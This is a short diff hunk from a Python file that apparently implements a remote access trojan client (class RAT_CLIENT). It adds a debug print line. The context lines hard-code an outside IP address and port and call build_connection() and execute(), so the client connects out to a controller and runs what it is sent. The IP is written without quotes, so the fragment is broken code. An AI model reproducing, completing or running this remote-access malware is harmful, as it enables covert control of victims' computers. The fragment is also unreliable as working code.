@@ -52,6 +52,7 @@ class RAT_CLIENT:
             print (e)
             rat = RAT_CLIENT(91.109.178.16, 1429)
             print(self.host, self.port)
+            print("mierda")
             if __name__ == '__main__':
                 rat.build_connection()
                 rat.execute()
